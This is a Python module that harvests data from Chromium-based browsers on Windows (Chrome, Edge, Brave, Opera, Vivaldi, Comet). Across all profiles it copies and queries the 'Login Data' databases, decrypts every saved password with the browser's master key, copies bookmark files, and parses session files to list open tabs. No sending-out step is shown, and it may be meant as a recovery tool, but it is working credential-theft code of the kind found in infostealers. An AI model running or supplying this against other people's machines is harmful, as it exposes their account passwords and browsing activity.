import os
import json
import sqlite3
import shutil
from utils.crypto import get_master_key, decrypt_password

class ChromiumExtractor:
    def __init__(self, browser_name, user_data_path):
        self.browser_name = browser_name
        self.user_data_path = os.path.expandvars(user_data_path)
        self.local_state_path = os.path.join(self.user_data_path, "Local State")

    def extract_passwords(self):
        all_results = []
        if not os.path.exists(self.user_data_path):
            return []
            
        # Discover all directories that contain 'Login Data'
        profile_dirs = []
        for root, dirs, files in os.walk(self.user_data_path):
            if "Login Data" in files:
                profile_dirs.append(root)
            if root.count(os.sep) - self.user_data_path.count(os.sep) > 1:
                del dirs[:] # Don't go too deep
        
        master_key = get_master_key(self.local_state_path)
        if not master_key:
            alt_local_state = os.path.join(os.path.dirname(self.user_data_path), "Local State")
            master_key = get_master_key(alt_local_state)
        
        for p_dir in profile_dirs:
            p_name = os.path.basename(p_dir)
            # Try to get human-readable name from Preferences
            display_name = p_name
            prefs_path = os.path.join(p_dir, "Preferences")
            if os.path.exists(prefs_path):
                try:
                    with open(prefs_path, "r", encoding="utf-8") as f:
                        prefs = json.load(f)
                        display_name = prefs.get("profile", {}).get("name", p_name)
                except:
                    pass

            login_db = os.path.join(p_dir, "Login Data")
            temp_db = f"temp_{self.browser_name}_{p_name}.db".replace(" ", "_")
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for url, user, password in cursor.fetchall():
                    if user or password:
                        decrypted_pass = decrypt_password(password, master_key)
                        all_results.append({
                            "browser": f"{self.browser_name} ({display_name})",
                            "url": url,
                            "user": user,
                            "password": decrypted_pass
                        })
                conn.close()
            except Exception as e:
                print(f"Error in {self.browser_name} ({display_name}): {e}")
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
            
        return all_results

    def extract_bookmarks(self, dest_dir):
        if not os.path.exists(self.user_data_path):
            return False
            
        profile_dirs = []
        for root, dirs, files in os.walk(self.user_data_path):
            if "Bookmarks" in files:
                profile_dirs.append(root)
            if root.count(os.sep) - self.user_data_path.count(os.sep) > 1:
                del dirs[:]
        
        target_root = os.path.join(dest_dir, "bookmarks", self.browser_name)
        os.makedirs(target_root, exist_ok=True)
        
        for p_dir in profile_dirs:
            p_name = os.path.basename(p_dir)
            src = os.path.join(p_dir, "Bookmarks")
            dst = os.path.join(target_root, f"Bookmarks_{p_name}")
            shutil.copy2(src, dst)
        return True

    def extract_open_tabs(self):
        """Extracts open tabs for all profiles of this Chromium browser."""
        import struct
        import re

        if not os.path.exists(self.user_data_path):
            return []

        profile_dirs = []
        for root, dirs, files in os.walk(self.user_data_path):
            if "Sessions" in dirs or "Preferences" in files or "Login Data" in files:
                profile_dirs.append(root)
            if root.count(os.sep) - self.user_data_path.count(os.sep) > 1:
                del dirs[:]

        all_tabs = []

        def parse_snss_payload(payload):
            try:
                offset = 12
                if len(payload) < offset + 4:
                    return None
                url_len = struct.unpack_from('<i', payload, offset)[0]
                offset += 4
                if url_len <= 0 or offset + url_len > len(payload):
                    return None
                url = payload[offset:offset+url_len].decode('utf-8', errors='ignore')
                offset += url_len
                if offset % 4 != 0:
                    offset += 4 - (offset % 4)

                title = ''
                if offset + 4 <= len(payload):
                    title_char_len = struct.unpack_from('<i', payload, offset)[0]
                    offset += 4
                    title_byte_len = title_char_len * 2
                    if 0 < title_byte_len and offset + title_byte_len <= len(payload):
                        title = payload[offset:offset+title_byte_len].decode('utf-16le', errors='ignore')
                return {'url': url, 'title': title.strip()}
            except Exception:
                return None

        for p_dir in profile_dirs:
            p_name = os.path.basename(p_dir)
            display_name = p_name
            prefs_path = os.path.join(p_dir, "Preferences")
            if os.path.exists(prefs_path):
                try:
                    with open(prefs_path, "r", encoding="utf-8") as f:
                        prefs = json.load(f)
                        display_name = prefs.get("profile", {}).get("name", p_name)
                except:
                    pass

            sessions_dir = os.path.join(p_dir, "Sessions")
            if not os.path.exists(sessions_dir):
                continue

            session_files = []
            for fname in os.listdir(sessions_dir):
                if fname.startswith("Session_") or fname.startswith("Tabs_") or fname in ("Current Session", "Current Tabs", "Last Session", "Last Tabs"):
                    session_files.append(os.path.join(sessions_dir, fname))

            # Sort files by modification time (most recent first)
            session_files.sort(key=lambda x: os.path.getmtime(x) if os.path.exists(x) else 0, reverse=True)

            profile_tabs = []
            seen_urls = set()

            for sfile in session_files:
                data = None
                try:
                    with open(sfile, 'rb') as fp:
                        data = fp.read()
                except Exception:
                    # If locked, try copying or skip to next
                    temp_sfile = f"temp_session_{os.path.basename(sfile)}.bin"
                    try:
                        shutil.copy2(sfile, temp_sfile)
                        with open(temp_sfile, 'rb') as fp:
                            data = fp.read()
                    except Exception:
                        pass
                    finally:
                        if os.path.exists(temp_sfile):
                            try:
                                os.remove(temp_sfile)
                            except:
                                pass

                if not data or not data.startswith(b'SNSS'):
                    continue

                pos = 8
                while pos < len(data):
                    if pos + 2 > len(data):
                        break
                    size = int.from_bytes(data[pos:pos+2], 'little')
                    pos += 2
                    if size == 0 or pos + size > len(data):
                        break
                    cmd_id = data[pos]
                    payload = data[pos+1:pos+size]
                    pos += size

                    if cmd_id in (1, 6):
                        parsed = parse_snss_payload(payload)
                        if parsed and parsed['url'].startswith(('http://', 'https://')):
                            url = parsed['url']
                            if not url.startswith('https://www.google.com/gen_204') and url not in seen_urls:
                                seen_urls.add(url)
                                profile_tabs.append({
                                    "browser": f"{self.browser_name} ({display_name})",
                                    "title": parsed['title'] if parsed['title'] else url,
                                    "url": url
                                })

            all_tabs.extend(profile_tabs)

        return all_tabs

# Standard paths pointing to "User Data" root
BROWSERS = {
    "Chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data",
    "Edge": r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    "Brave": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    "Opera": r"%APPDATA%\Opera Software\Opera Stable",
    "Opera GX": r"%APPDATA%\Opera Software\Opera GX Stable",
    "Vivaldi": r"%LOCALAPPDATA%\Vivaldi\User Data",
    "Comet": r"%LOCALAPPDATA%\Perplexity\Comet\User Data",
}
